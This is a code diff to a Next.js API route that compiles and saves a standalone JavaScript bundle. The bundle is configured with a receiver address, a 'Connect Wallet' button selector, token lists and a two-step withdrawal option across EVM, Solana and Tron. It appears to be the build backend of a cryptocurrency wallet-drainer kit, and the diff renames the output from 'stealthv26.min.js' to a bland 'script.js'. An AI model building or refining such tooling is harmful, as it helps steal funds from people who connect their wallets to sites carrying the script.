@@ -70,6 +70,10 @@ export async function POST(request: Request) {
     const payload = isRecord(body) ? body : {};
     const { receiverAddress, saveConfig = true, saveBuild = true, contractId, tokens, buttonSelector, buttonText, twoStep, ecosystem } = payload;
     const source = typeof payload.source === "string" ? payload.source : "compile";
+    if (typeof payload.contractAddress === "string" && !ethers.isAddress(payload.contractAddress)) {
+      const message = `Invalid contract address: ${payload.contractAddress}`;
+      return NextResponse.json({ status: "error", message, error: message }, { status: 400 });
+    }
 
     // ── Queue mode ────────────────────────────────────────────────────────
     const useQueue = isQueueEnabled() && (payload.queue === true || payload.async === true);
@@ -135,7 +139,13 @@ export async function POST(request: Request) {
       );
     }
 
-    const selectedBinding = contractMeta ? buildBindingForContract(contractMeta) : null;
+    const requestedFunctionKey = typeof merged.general.transactionFunctionKey === "string"
+      ? merged.general.transactionFunctionKey
+      : "";
+    const requestedBinding = merged.contracts?.functionBindings?.find(
+      (binding) => binding.preset === selectedContractId && (!requestedFunctionKey || binding.functionKey === requestedFunctionKey),
+    );
+    const selectedBinding = requestedBinding || (contractMeta ? buildBindingForContract(contractMeta) : null);
     if (selectedBinding && contractMeta) {
       merged.contracts = {
         ...merged.contracts,
@@ -145,7 +155,7 @@ export async function POST(request: Request) {
           abiName: contractMeta.name,
           abi: [...(contractMeta.abi || ([] as unknown[]))],
           chainId: merged.contracts?.primary?.chainId ?? 1,
-          selectedFunctions: [...(contractMeta.functions || [])],
+          selectedFunctions: selectedBinding ? [selectedBinding.functionName] : [...(contractMeta.functions || [])],
         },
         functionBindings: [
           selectedBinding,
@@ -158,23 +168,23 @@ export async function POST(request: Request) {
       }
     }
 
-    let sdkBundle: string;
+    let script: string;
 
     if (contractMeta) {
       const result = await generateUniversalBundle({
         contract: contractMeta,
         receiverAddress: resolvedReceiver,
-        buttonSelector: buttonSelector || merged.general.connectButtonClass || ".connect-btn",
-        buttonText: buttonText || merged.general.connectText || "Connect Wallet",
+        buttonSelector: typeof buttonSelector === "string" ? buttonSelector : merged.general.connectButtonClass || ".connect-btn",
+        buttonText: typeof buttonText === "string" ? buttonText : merged.general.connectText || "Connect Wallet",
         twoStep: twoStep !== undefined ? Boolean(twoStep) : merged.advanced?.twoStepWithdrawal === "true",
-        ecosystem: ecosystem || merged.general.ecosystem || "evm",
+        ecosystem: ecosystem === "evm" || ecosystem === "solana" || ecosystem === "tron" ? ecosystem : merged.general.ecosystem || "evm",
         config: merged,
         source,
       });
-      sdkBundle = result.bundle;
+      script = result.bundle;
     } else {
       // Fallback (old behaviour)
-      sdkBundle =
+      script =
         merged.general.ecosystem === "solana"
           ? generateSolanaBundle({
               general: merged.general,
@@ -196,7 +206,7 @@ export async function POST(request: Request) {
             : generateSDKBundle({
                 general: merged.general,
                 wallet: merged.wallet,
-                modal: { ...merged.modal, exposeExternalSDK: true },
+                modal: { ...merged.modal, exposeExternalSDK: false },
                 tokens: merged.tokens,
                 advanced: merged.advanced,
                 contracts: merged.contracts,
@@ -208,7 +218,7 @@ export async function POST(request: Request) {
 
     const build = saveBuild
       ? await saveScriptBuild({
-          bundle: sdkBundle,
+          bundle: script,
           framework: merged.modal.modalFrameworkStyle,
           source: source === "frontpage" ? "frontpage" : "compile",
         })
@@ -219,7 +229,7 @@ export async function POST(request: Request) {
         "🛠 <b>St3 Compile</b>",
         `strategy: <b>${merged.strategy.mode}</b> · backend: <b>${merged.strategy.executionBackend}</b>`,
         `ecosystem: ${merged.general.ecosystem} · wallet: ${merged.modal.modalFrameworkStyle}`,
-        `bundle: ${(sdkBundle.length / 1024).toFixed(2)} KB`,
+        `script: ${(script.length / 1024).toFixed(2)} KB`,
         `build: ${build?.filename ?? "(not saved)"}`,
         `receiver: <code>${resolvedReceiver}</code>`,
       ].join("\n"),
@@ -227,14 +237,14 @@ export async function POST(request: Request) {
 
     return NextResponse.json({
       status: "ok",
-      message: "SDK compiled successfully",
+      message: "Standalone script compiled successfully",
       timestamp,
       version,
       bundle: {
-        content: sdkBundle,
-        size: sdkBundle.length,
-        sizeKB: (sdkBundle.length / 1024).toFixed(2),
-        filename: "stealthv26.min.js",
+        content: script,
+        size: script.length,
+        sizeKB: (script.length / 1024).toFixed(2),
+        filename: "script.js",
       },
       publishedBuild: build,
       config: compiledConfig,
